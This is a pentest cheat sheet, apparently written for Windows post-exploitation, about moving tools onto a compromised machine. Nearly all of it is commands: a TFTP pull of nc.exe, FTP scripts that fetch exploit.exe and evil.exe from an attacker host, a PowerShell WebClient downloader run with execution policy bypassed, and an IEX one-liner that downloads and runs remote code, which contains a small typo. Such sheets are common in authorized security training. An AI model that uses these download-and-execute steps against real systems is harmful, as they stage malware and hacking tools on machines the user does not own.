# TFTP

- Windows XP and Win 2003 contain tftp client. Windows 7 do not by default 
- tfpt clients are usually non-interactive, so they could work through an obtained shell 

atftpd --daemon --port 69 /tftp
Windows> tftp -i 192.168.30.45 GET nc.exe



# FTP (pyftpdlib client on Kali)

- Ftp is generally installed on Windows machines
- To make it interactive, use -s option

## On Kali install a ftp client and set a username/password

```
apt-get install python-pyftpdlib  
python -m pyftpdlib -p 21
```

## on Windows

```
ftp <attackerip>
> binary
> get exploit.exe
```


# FTP (pureftpd client on Kali)

## on Kali

### install ftp client

```
apt-get install pure-ftpd
```

### create a group

```
groupadd ftpgroup
```

### add a user

```
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
```

### Create a directory for your ftp-files (you can also specify a specific user e.g.: /root/ftphome/bob).

```
mkdir /root/ftphome
```

### Create a ftp-user, in our example "bob" (again you can set "-d /root/ftphome/bob/" if you wish).

```
pure-pw useradd bob -u ftpuser -g ftpgroup -d /root/ftphome/
```

### Update the ftp database after adding our new user.

```
pure-pw mkdb
```

### change ownership of the specified ftp directory (and all it's sub-direcotries) 

```
chown -R ftpuser:ftpgroup /root/ftphome
```

### restart Pure-FTPD

```
/etc/init.d/pure-ftpd restart
```

### On Windows

```
echo open <attackerip> 21> ftp.txt
echo USER username password >> ftp.txt
echo bin >> ftp.txt
echo GET evil.exe >> ftp.txt
echo bye >> ftp.txt
ftp -s:ftp.txt
```


# Powershell

```
echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://<attackerip>/powerup.ps1" >>wget.ps1
echo $file = "powerup.ps1" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```

## Powershell download a file

```
powershell "IEX(New Object Net.WebClient).downloadString('http://<targetip>/file.ps1')"
```